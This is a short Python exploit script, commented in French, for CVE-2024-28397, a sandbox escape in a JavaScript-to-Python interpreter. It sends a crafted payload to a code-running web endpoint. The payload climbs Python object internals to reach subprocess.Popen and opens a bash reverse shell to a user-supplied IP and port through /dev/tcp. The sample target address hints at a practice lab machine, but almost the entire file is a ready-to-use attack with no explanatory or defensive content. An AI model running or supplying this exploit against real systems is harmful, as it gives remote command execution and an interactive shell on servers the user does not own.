#!/usr/bin/env python3

import requests
import json
import argparse

parser = argparse.ArgumentParser(description="CVE-2024-28397 - Remotely")
parser.add_argument("-u", required=True, help="URL cible, ex: http://10.10.11.82:8000/run_code")
parser.add_argument("-i", required=True, help="Adresse IP locale")
parser.add_argument("-p", required=True, help="Port local")
args = parser.parse_args()

payload = f"""
let cmd = "bash -c 'bash -i >& /dev/tcp/{args.i}/{args.p} 0>&1'"; //modifié stdout ignoré si pas de shell
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({{}});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");
obj = n11("__class__").__base__;
getattr = obj.__getattribute__;

function findpopen(o) {{
    let result;
    for(let i in o.__subclasses__()) {{
        let item = o.__subclasses__()[i];
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
            if(item.__name__ != "type" && (result = findpopen(item))) {{
                return result;
            }}
            return item;
        }}
    }}
}}

// Exécution du reverse shell via subprocess.Popen
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
console.log(result);
result;
"""

# Préparation de la requête HTTP
code = { "code": payload }
headers = { "Content-Type": "application/json" }

# Envoi du payload
print(f"[+] Envoi du payload vers {args.u}")
print(f"[+] Reverse shell sur {args.i}:{args.p}")
print("[!] Keep calm & privesc...")
response = requests.post(args.u, data=json.dumps(code), headers=headers)

